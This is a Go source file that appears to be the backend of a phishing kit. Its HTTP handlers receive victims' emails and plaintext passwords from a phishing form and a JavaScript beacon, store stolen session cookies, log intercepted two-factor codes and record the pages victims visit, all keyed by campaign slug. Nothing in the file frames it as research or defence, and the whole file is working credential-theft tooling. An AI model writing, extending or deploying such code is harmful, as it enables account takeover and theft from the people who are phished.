// capture/handler.go
package capture

import (
	"encoding/json"
	"log"
	"net/http"
	"time"
)

/* ───────── helpers ─────────────────────────────────────────── */

// extract slug or abort with 400
func ctxSlug(w http.ResponseWriter, r *http.Request) (string, bool) {
	slug, ok := r.Context().Value("slug").(string)
	if !ok || slug == "" {
		http.Error(w, "slug missing", http.StatusBadRequest)
		return "", false
	}
	return slug, true
}

/* ───────── /submit  (static form) ──────────────────────────── */

func HandleSubmit(w http.ResponseWriter, r *http.Request) {
	slug, ok := ctxSlug(w, r)
	if !ok {
		return
	}

	var cred Credential
	if err := json.NewDecoder(r.Body).Decode(&cred); err != nil {
		http.Error(w, "invalid JSON", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	cred.Slug = slug
	if cred.UserAgent == "" {
		cred.UserAgent = r.UserAgent()
	}
	if cred.Timestamp == "" {
		cred.Timestamp = time.Now().UTC().Format(time.RFC3339)
	}

	log.Printf("[+] Captured (slug %s) %s / %s", slug, cred.Email, cred.Password)

	SaveCreds(map[string]string{
		"login":      cred.Email,
		"passwd":     cred.Password,
		"user_agent": cred.UserAgent,
		"slug":       slug,
	}, r.RemoteAddr)

	w.WriteHeader(http.StatusOK)
	_, _ = w.Write([]byte(`{"status":"ok"}`))
}

/* ───────── /pass  (JS beacon) ─────────────────────────────── */

func HandlePass(w http.ResponseWriter, r *http.Request) {
	slug, ok := ctxSlug(w, r)
	if !ok {
		return
	}

	var data Credential
	if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
		http.Error(w, "invalid JSON", http.StatusBadRequest)
		return
	}
	data.Slug = slug

	log.Printf("[PASS] %s | %s (slug %s)", data.Email, data.Password, slug)

	SaveCreds(map[string]string{
		"login":      data.Email,
		"passwd":     data.Password,
		"user_agent": data.UserAgent,
		"slug":       slug,
	}, r.RemoteAddr)

	w.Write([]byte(`{"status":"ok"}`))
}

/* ───────── /cookie  ───────────────────────────────────────── */

func HandleCookie(w http.ResponseWriter, r *http.Request) {
	slug, ok := ctxSlug(w, r)
	if !ok {
		return
	}

	var data CookieDump
	if json.NewDecoder(r.Body).Decode(&data) != nil || data.Email == "" {
		http.Error(w, "bad JSON", http.StatusBadRequest)
		return
	}

	entry := CookieEntry{
		Domain:    data.Hostname,
		Raw:       data.Cookies,
		Session:   true,
		Timestamp: time.Now().UTC(),
	}
	SaveCookieFor(slug, data.Email, entry)

	log.Printf("[COOKIE] %s %s", slug, data.Email)
	w.Write([]byte(`{"status":"ok"}`))
}

/* ───────── /2fa  ─────────────────────────────────────────── */

func Handle2FA(w http.ResponseWriter, r *http.Request) {
	slug, ok := ctxSlug(w, r)
	if !ok {
		return
	}

	var data TwoFACode
	if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
		http.Error(w, "bad JSON", http.StatusBadRequest)
		return
	}
	data.Slug = slug

	log.Printf("[2FA] %s | %s (%s) [slug %s]", data.Token, data.Method, data.Hostname, slug)
	w.Write([]byte(`{"status":"ok"}`))
}

/* ───────── /sync  ─────────────────────────────────────────── */

func HandleSessionSync(w http.ResponseWriter, r *http.Request) {
	slug, ok := ctxSlug(w, r)
	if !ok {
		return
	}

	var data SessionEvent
	if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
		http.Error(w, "bad JSON", http.StatusBadRequest)
		return
	}
	data.Slug = slug

	log.Printf("[SYNC] %s | %s (slug %s)", data.Title, data.URL, slug)
	w.Write([]byte(`{"status":"ok"}`))
}
